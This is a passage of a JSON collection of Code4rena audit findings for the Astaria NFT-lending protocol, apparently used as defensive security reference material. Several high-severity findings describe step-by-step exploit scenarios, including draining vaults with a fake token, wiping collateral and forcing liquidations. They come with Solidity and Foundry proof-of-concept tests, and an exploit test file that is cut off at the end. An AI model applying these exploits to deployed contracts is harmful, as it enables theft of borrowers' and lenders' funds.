      "github_link": "https://github.com/code-423n4/2023-01-astaria-findings/issues/235",
      "tags": [],
      "finders": [
        "Koolex"
      ]
    },
    {
      "id": "25809",
      "title": "[H-14] A malicious private vault can preempt the creation of a public vault by transferring lien tokens to the public vault, thereby preventing the borrower from repaying all loans",
      "impact": "HIGH",
      "content": "\nIn LienToken.transferFrom, transferring lien tokens to the public vault is prohibited because variables such as liensOpenForEpoch are not updated when the public vault receives a lien token, which would prevent the borrower from repaying the loan in that lien token.\n\n```solidity\n  function transferFrom(\n    address from,\n    address to,\n    uint256 id\n  ) public override(ERC721, IERC721) {\n    LienStorage storage s = _loadLienStorageSlot();\n    if (_isPublicVault(s, to)) {\n      revert InvalidState(InvalidStates.PUBLIC_VAULT_RECIPIENT);\n    }\n    if (s.lienMeta[id].atLiquidation) {\n      revert InvalidState(InvalidStates.COLLATERAL_AUCTION);\n    }\n    delete s.lienMeta[id].payee;\n    emit PayeeChanged(id, address(0));\n    super.transferFrom(from, to, id);\n  }\n```\n\nHowever, public vaults are created using the ClonesWithImmutableArgs.clone function, which uses the `create` opcode, which allows the address of the public vault to be predicted before it is created.\n\n<https://ethereum.stackexchange.com/questions/760/how-is-the-address-of-an-ethereum-contract-computed>\n\n```solidity\n            assembly {\n                instance := create(0, ptr, creationSize)\n            }\n```\n\nThis allows a malicious private vault to transfer lien tokens to the predicted public vault address in advance, and then call AstariaRouter.newPublicVault to create the public vault, which has a liensOpenForEpoch of 0.<br>\nWhen the borrower repays the loan via LienToken.makePayment, decreaseEpochLienCount fails due to overflow in \\_payment, resulting in the liquidation of the borrower's collateral\n\n```solidity\n    } else {\n      amount = stack.point.amount;\n      if (isPublicVault) {\n        // since the openLiens count is only positive when there are liens that haven't been paid off\n        // that should be liquidated, this lien should not be counted anymore\n        IPublicVault(lienOwner).decreaseEpochLienCount(\n          IPublicVault(lienOwner).getLienEpoch(end)\n        );\n      }\n```\n\nConsider the following scenario where private vault A provides a loan of 1 ETH to the borrower, who deposits NFT worth 2 ETH and borrows 1 ETH.<br>\nPrivate Vault A creates Public Vault B using the account alice and predicts the address of Public Vault B before it is created and transfers the lien tokens to it.<br>\nThe borrower calls LienToken.makePayment to repay the loan, but fails due to overflow.<br>\nThe borrower is unable to repay the loan, and when the loan expires, the NFTs used as collateral are auctioned.\n\n### Proof of Concept\n\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L360-L375><br>\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L835-L847><br>\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/AstariaRouter.sol#L731-L742><br>\n<https://ethereum.stackexchange.com/questions/760/how-is-the-address-of-an-ethereum-contract-computed>\n\n### Recommended Mitigation Steps\n\nIn LienToken.transferFrom, require to.code.length >0, thus preventing the transfer of lien tokens to uncreated public vaults\n\n```diff\n  function transferFrom(\n    address from,\n    address to,\n    uint256 id\n  ) public override(ERC721, IERC721) {\n    LienStorage storage s = _loadLienStorageSlot();\n    if (_isPublicVault(s, to)) {\n      revert InvalidState(InvalidStates.PUBLIC_VAULT_RECIPIENT);\n    }\n+  require(to.code.length > 0);\n    if (s.lienMeta[id].atLiquidation) {\n      revert InvalidState(InvalidStates.COLLATERAL_AUCTION);\n    }\n    delete s.lienMeta[id].payee;\n    emit PayeeChanged(id, address(0));\n    super.transferFrom(from, to, id);\n  }\n```\n\n**[androolloyd (Astaria) commented](https://github.com/code-423n4/2023-01-astaria-findings/issues/246#issuecomment-1401801777):**\n > The mitigation seems like it now blocks transfers to eoas.\n\n**[SantiagoGregory (Astaria) confirmed](https://github.com/code-423n4/2023-01-astaria-findings/issues/246)**\n\n**[Picodes (judge) commented](https://github.com/code-423n4/2023-01-astaria-findings/issues/246#issuecomment-1436028951):**\n > Indeed the mitigation may have unintended consequences.\n\n\n\n***\n\n",
      "summary": "\nA bug has been identified in Astaria, a decentralized lending platform, which allows malicious private vaults to predict the address of public vaults before they are created and transfer lien tokens to them. This can result in the liquidation of the borrower's collateral when they attempt to repay their loan.\n\nThe bug is located in the LienToken.transferFrom function, which is used to transfer lien tokens from one account to another. The function includes a check to ensure that the public vault is not the recipient of the transfer, as the variables such as liensOpenForEpoch are not updated when the public vault receives a lien token, which would prevent the borrower from repaying the loan in that lien token.\n\nHowever, public vaults are created using the ClonesWithImmutableArgs.clone function, which uses the `create` opcode, which allows the address of the public vault to be predicted before it is created. This allows a malicious private vault to transfer lien tokens to the predicted public vault address in advance, and then call AstariaRouter.newPublicVault to create the public vault, which has a liensOpenForEpoch of 0. When the borrower repays the loan via LienToken.makePayment, decreaseEpochLienCount fails due to overflow in \\_payment, resulting in the liquidation of the borrower's collateral.\n\nA proof of concept has been provided to demonstrate the bug, as well as a recommended mitigation step which requires that the `to.code.length` is greater than 0 when transferring lien tokens, thus preventing the transfer of lien tokens to uncreated public vaults. However, it has been noted that this mitigation may have unintended consequences.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Astaria",
      "source_link": "https://code4rena.com/reports/2023-01-astaria",
      "github_link": "https://github.com/code-423n4/2023-01-astaria-findings/issues/246",
      "tags": [],
      "finders": [
        "cccz"
      ]
    },
    {
      "id": "25808",
      "title": "[H-13] Anyone can wipe complete state of any collateral at any point",
      "impact": "HIGH",
      "content": "\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/ClearingHouse.sol#L114-L167><br>\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/CollateralToken.sol#L524-L545><br>\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L497-L510><br>\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L623-L656>\n\nThe Clearing House is implemented as an ERC1155. This is used to settle up at the end of an auction. The Clearing House's token is listed as one of the Consideration Items, and when Seaport goes to transfer it, it triggers the settlement process.\n\nThis settlement process includes deleting the collateral state hash from LienToken.sol, burning all lien tokens, deleting the idToUnderlying mapping, and burning the collateral token. **These changes effectively wipe out all record of the liens, as well as removing any claim the borrower has on their underlying collateral.**\n\nAfter an auction, this works as intended. The function verifies that sufficient payment has been made to meet the auction criteria, and therefore all these variables should be zeroed out.\n\nHowever, the issue is that there is no check that this safeTransferFrom function is being called after an auction has completed. In the case that it is called when there is no auction, all the auction criteria will be set to 0, and therefore the above deletions can be performed with a payment of 0.\n\nThis allows any user to call the `safeTransferFrom()` function for any other user's collateral. This will wipe out all the liens on that collateral, and burn the borrower's collateral token, and with it their ability to ever reclaim their collateral.\n\n### Proof of Concept\n\nThe flow is as follows:\n\n*   safeTransferFrom(offerer, buyer, paymentToken, amount, data)\n*   \\_execute(offerer, buyer, paymentToken, amount)\n*   using the auctionStack in storage, it calculates the amount the auction would currently be listed at\n*   it confirms that the Clearing House has already received sufficient paymentTokens for this amount\n*   it then transfers the liquidator their payment (currently 13%)\n*   it calls `LienToken#payDebtViaClearingHouse()`, which pays back all liens, zeros out all lien storage and deletes the collateralStateHash\n*   if there is any remaining balance of paymentToken, it transfers it to the owner of the collateral\n*   it then calls `Collateral#settleAuction()`, which deletes idToUnderlying, collateralIdToAuction and burns the collateral token\n\nIn the case where the auction hasn't started, the `auctionStack` in storage is all set to zero. When it calculates the payment that should be made, it uses `_locateCurrentAmount`, which simply returns `endAmount` if `startAmount == endAmount`. In the case where they are all 0, this returns 0.\n\nThe second check that should catch this occurs in `settleAuction()`:\n\n        if (\n          s.collateralIdToAuction[collateralId] == bytes32(0) &&\n          ERC721(s.idToUnderlying[collateralId].tokenContract).ownerOf(\n            s.idToUnderlying[collateralId].tokenId\n          ) !=\n          s.clearingHouse[collateralId]\n        ) {\n          revert InvalidCollateralState(InvalidCollateralStates.NO_AUCTION);\n        }\n\nHowever, this check accidentally uses an `&&` operator instead of a `||`. The result is that, even if the auction hasn't started, only the first criteria is false. The second is checking whether the Clearing House owns the underlying collateral, which happens as soon as the collateral is deposited in `CollateralToken.sol#onERC721Received()`:\n\n          ERC721(msg.sender).safeTransferFrom(\n            address(this),\n            s.clearingHouse[collateralId],\n            tokenId_\n          );\n\n### Recommended Mitigation Steps\n\nChange the check in `settleAuction()` from an AND to an OR, which will block any collateralId that isn't currently at auction from being settled:\n\n        if (\n          s.collateralIdToAuction[collateralId] == bytes32(0) ||\n          ERC721(s.idToUnderlying[collateralId].tokenContract).ownerOf(\n            s.idToUnderlying[collateralId].tokenId\n          ) !=\n          s.clearingHouse[collateralId]\n        ) {\n          revert InvalidCollateralState(InvalidCollateralStates.NO_AUCTION);\n        }\n\n**[SantiagoGregory (Astaria) confirmed](https://github.com/code-423n4/2023-01-astaria-findings/issues/287)**\n\n\n\n***\n\n",
      "summary": "\nA bug has been identified in the Astaria project, which is a decentralized lending platform. The bug is related to the Clearing House, which is implemented as an ERC1155 and used to settle up at the end of an auction. The bug allows any user to call the `safeTransferFrom()` function for any other user's collateral, wiping out all the liens on that collateral and burning the borrower's collateral token.\n\nThe bug occurs when the `safeTransferFrom()` function is called when there is no auction. In this case, all the auction criteria will be set to 0, and therefore the above deletions can be performed with a payment of 0. This allows any user to call the `safeTransferFrom()` function for any other user's collateral, wiping out all the liens on that collateral and burning the borrower's collateral token.\n\nThe flow of the bug is as follows: the `safeTransferFrom()` function is called, then the `_execute()` function is called, which calculates the amount the auction would currently be listed at. It then confirms that the Clearing House has already received sufficient paymentTokens for this amount, and then transfers the liquidator their payment. It then calls `LienToken#payDebtViaClearingHouse()`, which pays back all liens, zeros out all lien storage and deletes the collateralStateHash, and if there is any remaining balance of paymentToken, it transfers it to the owner of the collateral. Finally, it calls `Collateral#settleAuction()`, which deletes idToUnderlying, collateralIdToAuction and burns the collateral token.\n\nThe bug occurs because there is no check that this `safeTransferFrom()` function is being called after an auction has completed. In addition, the check in `settleAuction()` uses an `&&` operator instead of a `||`, which allows the bug to occur.\n\nThe recommended mitigation steps for this bug are to change the check in `settleAuction()` from an AND to an OR, which will block any collateralId that isn't currently at auction from being settled. SantiagoGregory (Astaria) has confirmed this bug.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Astaria",
      "source_link": "https://code4rena.com/reports/2023-01-astaria",
      "github_link": "https://github.com/code-423n4/2023-01-astaria-findings/issues/287",
      "tags": [
        "ERC1155"
      ],
      "finders": [
        "c7e7eff",
        "KIntern\\_NA",
        "obront",
        "Koolex"
      ]
    },
    {
      "id": "25807",
      "title": "[H-12] Borrower can use liquidationInitialAsk to block future borrowers",
      "impact": "HIGH",
      "content": "\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L471-L489><br>\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L153-L174>\n\nWhen a new lien is taken (or bought out), one of the validations is to ensure that the `potentialDebt` of each borrower on the stack is less than or equal to their `liquidationInitialAsk`.\n\n    if (potentialDebt > newStack[j].lien.details.liquidationInitialAsk) {\n        revert InvalidState(InvalidStates.INITIAL_ASK_EXCEEDED);\n      }\n\nIn `_appendStack()` and `_buyoutLien()`, this is performed by iterating through the stack backwards, totaling up the `potentialDebt`, and comparing it to each lien's `liquidationInitialAsk`:\n\n    for (uint256 i = stack.length; i > 0; ) {\n          uint256 j = i - 1;\n          newStack[j] = stack[j];\n          if (block.timestamp >= newStack[j].point.end) {\n            revert InvalidState(InvalidStates.EXPIRED_LIEN);\n          }\n          unchecked {\n            potentialDebt += _getOwed(newStack[j], newStack[j].point.end);\n          }\n          if (potentialDebt > newStack[j].lien.details.liquidationInitialAsk) {\n            revert InvalidState(InvalidStates.INITIAL_ASK_EXCEEDED);\n          }\n\n          unchecked {\n            --i;\n          }\n        }\n\nHowever, only the first item on the stack has a `liquidationInitialAsk` that matters. When a new auction is started on Seaport, `Router#liquidate()` uses `stack[0].lien.details.liquidationInitialAsk` as the starting price. The other values are meaningless, except in their ability to DOS future borrowers.\n\n### Proof of Concept\n\n*   I set my `liquidationInitialAsk` to be exactly the value of my loan\n*   A borrower has already borrowed on their collateral, and the first loan on the stack will determine the auction price\n*   When they borrow from me, my `liquidationInitialAsk` is recorded\n*   Any future borrows will check that `futureBorrow + myBorrow <= myLiquidationInitialAsk`, which is not possible for any `futureBorrow > 0`\n*   The result is that the borrower will be DOS'd from all future borrows\n\nThis is made worse by the fact that `liquidationInitialAsk` is not a variable that can justify a refinance, so they'll need to either pay back the loan or find a refinancier who will beat one of the other terms (rate or duration) in order to get rid of this burden.\n\n### Recommended Mitigation Steps\n\nGet rid of all checks on `liquidationInitialAsk` except for comparing the total potential debt of the entire stack to the `liquidationInitialAsk` of the lien at position 0.\n\n**[Picodes (judge) commented](https://github.com/code-423n4/2023-01-astaria-findings/issues/289#issuecomment-1405635921):**\n > The scenario is correct but I don't think it is of high severity at first sight, considering setting `liquidationInitialAsk` too low only exposes the lender to a potential bad debt if the dutch auction settles below its debt\n\n**[Picodes (judge) commented](https://github.com/code-423n4/2023-01-astaria-findings/issues/289#issuecomment-1405638218):**\n > However, it seems from this and other findings that leaving the `liquidationInitialAsk` at the `lien` level has multiple unintended side effects.\n\n**[SantiagoGregory (Astaria) confirmed](https://github.com/code-423n4/2023-01-astaria-findings/issues/289)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a flaw in the code of the Astaria project, a blockchain-based lending platform. The code has a validation to ensure that the potential debt of each borrower on the stack is less than or equal to their liquidationInitialAsk. This is done by iterating through the stack backwards, totaling up the potential debt, and comparing it to each lien's liquidationInitialAsk. However, this validation only applies to the first item on the stack, which means that any future borrows will not be able to pass the validation. This leaves borrowers open to a Denial of Service (DoS) attack, as they will not be able to take out any loans.\n\nThe recommended mitigation steps for this bug are to remove all checks on liquidationInitialAsk except for comparing the total potential debt of the entire stack to the liquidationInitialAsk of the lien at position 0. This will ensure that all future borrows can pass the validation, and will protect borrowers from DoS attacks.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Astaria",
      "source_link": "https://code4rena.com/reports/2023-01-astaria",
      "github_link": "https://github.com/code-423n4/2023-01-astaria-findings/issues/289",
      "tags": [],
      "finders": [
        "obront"
      ]
    },
    {
      "id": "25806",
      "title": "[H-11] Malicious strategist could deny borrowers from repaying loan and force liquidation by setting a extremely high vault fee",
      "impact": "HIGH",
      "content": "\n<https://github.com/code-423n4/2023-01-astaria/blob/main/src/PublicVault.sol#L605><br>\n<https://github.com/code-423n4/2023-01-astaria/blob/main/src/test/TestHelpers.t.sol#L471>\n\n**Issue:** A malicious strategist can deny the repayment of loans by setting a extremely high vault fee during creation of a public vault. The high vault fee will cause a revert due to a failed integer conversion using SafeCastTo88(). This will lead to forced liquidation of the borrowers when the loans expire outstanding, making them lose their NFT collaterals. (Vault fee is an incentive awarded to strategist on each loan repayment,  where a percentage of the interest payment is allocated to the strategist, in terms of vault shares.)\n\n**High Likelihood:** The strategist could target borrowers by refinancing outstanding loans and transfering the loans to his high fee vault, which does not require the borrowers' consents. This can be achieved as refinancing can be done by anyone and the logic only checks for better interest rate and duration, but not the vault fee. The borrowers will not be aware of the issue, until they attempt to repay the loan. Furthermore, the strategist could specifically target loans that are about to expire, giving little reaction time for borrowers to report the issue.\n\n**Financial gain:** With the ability to force a liquidation, the strategist can possibly stand to gain financially (e.g. by refinancing the loans with a lower liquidationInitialAsk and then bid for the NFT collateral (with high gas fee) during liquidation.\n\nNote: Even if there are no lenders willing to lend to the vault due to the high vault fee, the strategist still can lend to its own vault to faciliate the refinance.\n\n### Proof of Concept\n\nThe bug can be replicated by changing the test case. Set vaultFee parameter to a high value (e.g. 1e13) as shown below in the file /src/test/TestHelpers.t.sol.  Then run testBasicPublicVaultLoan() in AsteriaTest.t.sol. In this test case, we will see that the strategist could create a public vault with a high vaultFee as there is no validation check for it. And any borrower could still proceed to deposit their collateral and take loan without any issues as the vaultFee is only accessed upon loan repayment.\n\n    function _createPublicVault(\n    \taddress strategist,\n    \taddress delegate,\n    \tuint256 epochLength\n    ) internal returns (address publicVault) {\n    \tvm.startPrank(strategist);\n    \t//bps\n    \tpublicVault = ASTARIA_ROUTER.newPublicVault(\n    \t\tepochLength,\n    \t\tdelegate,\n    \t\taddress(WETH9),\n    \t\t\t//uint256(0)\n    \t\t\tuint256(1e13),              //to replicate the bug, change vaultFee parameter from 0 to a high value like 1e13   \n    \t\tfalse,\n    \t\tnew address[](0),\n    \t\tuint256(0)\n    \t);\n    \tvm.stopPrank();\n    }\n\n<https://github.com/code-423n4/2023-01-astaria/blob/main/src/test/TestHelpers.t.sol#L471><br>\n<https://github.com/code-423n4/2023-01-astaria/blob/main/src/test/AstariaTest.t.sol#L90>\n\nHowever, when the borrower attempts to repay the loan, it will revert due to a failed integer conversion. As the fee is too high, convertToShare() will return a value that exceeds 88-bit, causing the safeCastTo88() in \\_handleStrategistInterestReward() to fail.\n\n      uint88 feeInShares = convertToShares(fee).safeCastTo88();\n\n<https://github.com/code-423n4/2023-01-astaria/blob/main/src/PublicVault.sol#L605>\n\n### Recommended Mitigation Steps\n\nCheck that the vaultFee is within a reasonable range during vault creation.\n\n**[SantiagoGregory (Astaria) confirmed via duplicate issue `#378`](https://github.com/code-423n4/2023-01-astaria-findings/issues/378#event-8415846539)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a malicious strategist being able to deny the repayment of loans by setting a extremely high vault fee during the creation of a public vault. This high vault fee will cause a revert due to a failed integer conversion using SafeCastTo88(), resulting in the forced liquidation of the borrowers when the loans expire outstanding, making them lose their NFT collaterals.\n\nThe strategist can target borrowers by refinancing outstanding loans and transfering the loans to their own high fee vault, which does not require the borrowers' consents. This can be done as refinancing only checks for better interest rate and duration, but not the vault fee. Furthermore, the strategist could specifically target loans that are about to expire, giving little reaction time for borrowers to report the issue.\n\nWith the ability to force a liquidation, the strategist can possibly stand to gain financially. Even if there are no lenders willing to lend to the vault due to the high vault fee, the strategist still can lend to its own vault to faciliate the refinance.\n\nThe bug can be replicated by changing the test case. Set vaultFee parameter to a high value (e.g. 1e13) as shown in the file /src/test/TestHelpers.t.sol.  Then run testBasicPublicVaultLoan() in AsteriaTest.t.sol. In this test case, we will see that the strategist could create a public vault with a high vaultFee as there is no validation check for it. And any borrower could still proceed to deposit their collateral and take loan without any issues as the vaultFee is only accessed upon loan repayment. However, when the borrower attempts to repay the loan, it will revert due to a failed integer conversion. As the fee is too high, convertToShare() will return a value that exceeds 88-bit, causing the safeCastTo88() in \\_handleStrategistInterestReward() to fail.\n\nThe recommended mitigation step for this bug is to check that the vaultFee is within a reasonable range during vault creation.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Astaria",
      "source_link": "https://code4rena.com/reports/2023-01-astaria",
      "github_link": "https://github.com/code-423n4/2023-01-astaria-findings/issues/295",
      "tags": [],
      "finders": [
        "caventa",
        "peakbolt",
        "kaden"
      ]
    },
    {
      "id": "25805",
      "title": "[H-10] Liquidation will fail if value set as `liquidationInitialAsk` > `2**88-1`, causing collateral to be permanently locked",
      "impact": "HIGH",
      "content": "\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L340>\n\nWhen a lien is initially created, the `liquidationInitialAsk` can be set as any uint256 value >= the amount of underlying borrowed. Later on however, if the position is liquidated, an auction is created which casts the `liquidationInitialAsk` value to a uint88. Taking a look at the function in `SafeCastLib.sol`, we can see that if the value is greater than the max uint88 value, execution is reverted:\n\n    function safeCastTo88(uint256 x) internal pure returns (uint88 y) {\n      require(x < 1 << 88);\n\n      y = uint88(x);\n    }\n\nThis reversion prevents auctions from ever being initialized, and since the only way to retrieve the collateral after the loan has expired is through auction, the collateral is permanently locked in the contract.\n\nFor reference, setting the `initialLiquidationAsk` > `309,485,009.8213451` DAI would trigger this error, and with a lesser value or higher decimal collateral, this may require a much lower USD equivalent. Additionally, setting a price this high is not particularly unrealistic considering it's the starting price for a dutch auction in which it should be intentionally priced much higher than it's worth.\n\n### Proof of Concept:\n\nWe can create the following test in `AstariaTest.t.sol` to verify:\n\n    function testCannotLiquidateTooHighInitialAsk() public {\n      TestNFT nft = new TestNFT(3);\n      vm.label(address(nft), \"nft\");\n      address tokenContract = address(nft);\n      uint256 tokenId = uint256(1);\n      address publicVault = _createPublicVault({\n        strategist: strategistOne,\n        delegate: strategistTwo,\n        epochLength: 14 days\n      });\n\n      _lendToVault(\n        Lender({addr: address(1), amountToLend: 50 ether}),\n        publicVault\n      );\n\n      uint256 vaultTokenBalance = IERC20(publicVault).balanceOf(address(1));\n      ILienToken.Stack[] memory stack;\n      (, stack) = _commitToLien({\n        vault: publicVault,\n        strategist: strategistOne,\n        strategistPK: strategistOnePK,\n        tokenContract: tokenContract,\n        tokenId: tokenId,\n        lienDetails: ILienToken.Details({\n          maxAmount: 50 ether,\n          rate: (uint256(1e16) * 150) / (365 days),\n          duration: 10 days,\n          maxPotentialDebt: 0 ether,\n          liquidationInitialAsk: type(uint256).max\n        }),\n        amount: 5 ether,\n        isFirstLien: true\n      });\n\n      uint256 collateralId = tokenContract.computeId(tokenId);\n\n      skip(14 days); // end of loan\n      vm.expectRevert();\n      OrderParameters memory listedOrder = ASTARIA_ROUTER.liquidate(\n        stack,\n        uint8(0)\n      );\n    }\n\n### Recommendation\n\nThis can be avoided by using a uint256 as the `auctionData.startAmount`.\n\n**[SantiagoGregory (Astaria) confirmed](https://github.com/code-423n4/2023-01-astaria-findings/issues/375)**\n\n\n\n***\n\n",
      "summary": "\nA bug has been identified in the Astaria codebase, which affects the `LienToken.sol` file. When a lien is initially created, the `liquidationInitialAsk` can be set as any uint256 value greater than or equal to the amount of underlying borrowed. However, if the position is liquidated, an auction is created which casts the `liquidationInitialAsk` value to a uint88. This causes an issue if the value is greater than the max uint88 value, as the execution is reverted which prevents auctions from ever being initialized. This means that the collateral is permanently locked in the contract, and cannot be retrieved after the loan has expired.\n\nTo prove this bug, a test was created in `AstariaTest.t.sol` to verify that the revert occurs if the `initialLiquidationAsk` is greater than `309,485,009.8213451` DAI.\n\nThe bug can be avoided by using a uint256 as the `auctionData.startAmount`. SantiagoGregory (Astaria) has confirmed this.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Astaria",
      "source_link": "https://code4rena.com/reports/2023-01-astaria",
      "github_link": "https://github.com/code-423n4/2023-01-astaria-findings/issues/375",
      "tags": [],
      "finders": [
        "rvierdiiev",
        "kaden"
      ]
    },
    {
      "id": "25804",
      "title": "[H-09] At the second time the nft is used as collateral to take a loan, the debt repayment via auction fund can be failed when liquidation",
      "impact": "HIGH",
      "content": "\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/ClearingHouse.sol#L143-L146>\n\nWhen a user transfer an NFT to `CollateralToken` contract, it will toggle the function `CollateralToken.onERC721Received()`. In this function if there didn't exist any `clearingHouse` for the `collateralId`, it will create a new one for that collateral.\n\n```solidity\nif (s.clearingHouse[collateralId] == address(0)) {\n    address clearingHouse = ClonesWithImmutableArgs.clone(\n      s.ASTARIA_ROUTER.BEACON_PROXY_IMPLEMENTATION(),\n      abi.encodePacked(\n        address(s.ASTARIA_ROUTER),\n        uint8(IAstariaRouter.ImplementationType.ClearingHouse),\n        collateralId\n      )\n    );\n\n    s.clearingHouse[collateralId] = clearingHouse;\n  }\n```\n\nThe interesting thing of this technique is: there will be **just one `clearingHouse`** be used for each collateral no matter how many times the collateral is transferred to the contract. Even when the lien is liquidated / fully repayed, the `s.clearingHouse[collateralId]` remain unchanged.\n\nThe question here is any stale datas in `clearingHouse` from the previous time that the nft was used as collateral can affect the behavior of protocol when the nft was transfered to CollateralToken again?\n\nLet take a look at the function [`ClearingHouse._execute()`](https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/ClearingHouse.sol#L114). In this function, the implementation uses `safeApprove()` to approve `payment - liquidatorPayment` amount for the `TRANSFER_PROXY`.\n\n```solidity\nERC20(paymentToken).safeApprove(\n  address(ASTARIA_ROUTER.TRANSFER_PROXY()),\n  payment - liquidatorPayment\n);\n```\n\nthe `safeApprove` function will revert if the allowance was set from non-zero value to non-zero value. This will incur some potential risk for the function like example below:\n\n1.  NFT x is transferred to `CollateralToken` to take loans and then it is liquidated.\n2.  At time 10, function `ClearingHouse._execute()` was called and the `payment - liquidatorPayment > totalDebt`. This will the `paymentToken.allowance[clearingHouse][TRANSFER_PROXY] > 0` after the function ended.\n3.  NFT x is transferred to `CollateralToken` for the second time to take a loans and then it is liquidated again.\n4.  At time 15 (> 10), function `ClearingHouse._execute()` was called, but at this time, the `safeApprove` will revert since the previous allowance is different from 0\n\n### Impact\n\nThe debt can be repayed by auction funds when liquidation.\n\n### Recommended Mitigation Steps\n\nConsider to use `approve` instead of `safeApprove`.\n\n**[androolloyd (Astaria) commented](https://github.com/code-423n4/2023-01-astaria-findings/issues/379#issuecomment-1404007645):**\n > We use the solmate library which doesn't seem to have a check for approvals being set to 0.\n\n**[SantiagoGregory (Astaria) confirmed](https://github.com/code-423n4/2023-01-astaria-findings/issues/379)**\n\n\n\n***\n\n",
      "summary": "\nA bug was discovered in the Astaria protocol that could potentially cause an issue when a user transfers a non-fungible token (NFT) to the CollateralToken contract. This bug is related to the function `CollateralToken.onERC721Received()` which creates a new clearingHouse for the collateralId if one does not already exist. The bug is related to the function `ClearingHouse._execute()` which uses the `safeApprove()` function to approve the `payment - liquidatorPayment` amount for the `TRANSFER_PROXY`. The `safeApprove` function will revert if the allowance was set from a non-zero value to a non-zero value. \n\nThe bug could cause an issue in the following scenario:\n\n1. NFT x is transferred to CollateralToken to take a loan and then is liquidated.\n2. At time 10, the `ClearingHouse._execute()` function is called and the `payment - liquidatorPayment > totalDebt`. This will set the `paymentToken.allowance[clearingHouse][TRANSFER_PROXY] > 0` after the function ends.\n3. NFT x is transferred to CollateralToken for the second time to take a loan and is liquidated again.\n4. At time 15 (> 10), the `ClearingHouse._execute()` function is called, but at this time, the `safeApprove` will revert since the previous allowance is different from 0.\n\nThis bug could impact the ability of the protocol to repay the debt through auction funds when liquidation. The recommended mitigation step is to consider using `approve` instead of `safeApprove`. The solmate library, which is used by the protocol, does not have a check for approvals being set to 0.",
      "quality_score": 2,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Astaria",
      "source_link": "https://code4rena.com/reports/2023-01-astaria",
      "github_link": "https://github.com/code-423n4/2023-01-astaria-findings/issues/379",
      "tags": [],
      "finders": [
        "KIntern\\_NA"
      ]
    },
    {
      "id": "25803",
      "title": "[H-08] Lack of StrategyDetailsParam.vault validation allows the borrower to steal all the funds from the vault",
      "impact": "HIGH",
      "content": "\n<https://github.com/code-423n4/2023-01-astaria/blob/main/src/VaultImplementation.sol#L287>\n\nWhen a borrower takes a loan, Strategy details are passed along with other required data, and through the overall **commitToLien** flow, all the data are validated except the StrategyDetailsParam.vault\n\n```sh\n  struct StrategyDetailsParam {\n    uint8 version;\n    uint256 deadline;\n    address vault;\n  }\n```\n\nA borrower then can pass different vault's address, and when creating a lien this  vault is considered. Later, the borrower makes a payment, it reads the asset from this vault. Thus, the borrower can take loans and repay with whatever token.\n\n<https://github.com/code-423n4/2023-01-astaria/blob/main/src/LienToken.sol#L849>\n\n### Exploit Scenario\n\nAllow me to describe a scenario where the borrower can steal all the funds from all vaults that support his/her collateral:\n\n1.  **Bob** owns an NFT.\n2.  **Bob** sends his NFT to the collateral token contract.\n3.  **Bob** creates his own private vault **BobVault** with an asset that he created **FakeToken** which doesn’t have any value in the market (e.g. just a new ERC20 token).\n4.  **Bob** takes a loan from **Vault1** (while passing **BobVault** in the strategy param).\n5.  **Bob** pay the loan with his **FakeToken** instead **Vault1**'s asset.\n6.  **Bob** then repeats the steps from point 4 again till **Vault1** is drained.\n7.  **Bob** now has all the funds from **Vault1** with **zero** debt.\n8.  **Strategist** has the same amount of **Vault1**'s funds but in **FakeToken**.\n\nThis exploit can be done with other vaults draining all the funds.<br>\nTo prove this, I've coded the scenario below.\n\n### Proof of Concept\n\n1.  Please create a file with a name **StealAllFundsExploit.t.sol** under **src/test/** directory.\n\n2.  Add the following code to the file.\n\n```sh\npragma solidity =0.8.17;\n\nimport \"forge-std/Test.sol\";\n\nimport {Authority} from \"solmate/auth/Auth.sol\";\nimport {FixedPointMathLib} from \"solmate/utils/FixedPointMathLib.sol\";\nimport {MockERC721} from \"solmate/test/utils/mocks/MockERC721.sol\";\nimport {\n  MultiRolesAuthority\n} from \"solmate/auth/authorities/MultiRolesAuthority.sol\";\n\nimport {ERC721} from \"gpl/ERC721.sol\";\nimport {SafeCastLib} from \"gpl/utils/SafeCastLib.sol\";\nimport {IAstariaRouter, AstariaRouter} from \"../AstariaRouter.sol\";\nimport {VaultImplementation} from \"../VaultImplementation.sol\";\nimport {PublicVault} from \"../PublicVault.sol\";\nimport {TransferProxy} from \"../TransferProxy.sol\";\nimport {WithdrawProxy} from \"../WithdrawProxy.sol\";\nimport \"./TestHelpers.t.sol\";\nimport {MockERC20} from \"solmate/test/utils/mocks/MockERC20.sol\";\nimport {IVaultImplementation} from 